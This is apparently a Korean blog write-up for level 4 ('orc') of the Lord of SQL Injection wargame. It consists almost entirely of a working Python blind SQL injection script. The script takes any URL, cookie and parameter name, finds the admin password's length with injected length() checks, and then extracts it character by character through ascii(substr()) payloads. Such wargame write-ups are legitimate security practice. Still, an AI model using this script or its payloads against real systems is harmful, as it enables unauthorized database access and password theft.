---
title: LOS - 4번 orc
category: Lord of SQL Injection
---

# [04] orc

## 풀이

```python
import requests

# 길이 확인
def check_length(url, cookie, param_name):
    head = {"PHPSESSID":f"{cookie}"}
    print("대상 문자열의 길이를 확인중입니다..")
    for num in range(0,30):
        param=f"?{param_name}=' or id=\"admin\" and length({param_name})={num} %23"
        my_url=url+param
        res=requests.get(my_url, cookies=head)
        if("Hello admin" in res.text):
            return num

# 문자열 찾기
def blind_sqli(url, cookie, param_name, length):
    head = {"PHPSESSID":f"{cookie}"}
    ans=""
    for len in range(1, length+1):
        print(f"{len}번째 문자에 대해 검색중입니다..")
        for ran in range(32,127):
            param=f"?{param_name}=' or id=\"admin\" and ascii(substr({param_name},{len},1))={ran} %23"
            my_url=url+param
            res=requests.get(my_url, cookies=head)
            if("Hello admin" in res.text):
                # print(f"{len}번째 문자:{chr(ran)}")
                ans+=chr(ran)
                break
    return ans

# 실행 순서
if __name__ == "__main__":
    print("💘 Blind 공격을 시작합니다")
    
    url=input("URL을 입력하세요:")
    cookie=input("cookie를 알려주세요:")
    param_name=input("파라미터의 이름을 알려주세요:")
    
    length=check_length(url, cookie, param_name)
    print(f"👏 {param_name}의 길이는 {length}입니다.")
    
    ans=blind_sqli(url, cookie, param_name, length)
    print(f"👏 {param_name}의 정체는 {ans}입니다!")
    
    exit
```

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F9Szay%2Fbtrm0qQmnZc%2FSUeVVIMRxFTgmSzVhI52o1%2Fimg.png">

## 결과

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fdk9Qyb%2FbtrmXRVXq7F%2FhnPyYulfQxIbIkWuqczJz0%2Fimg.png">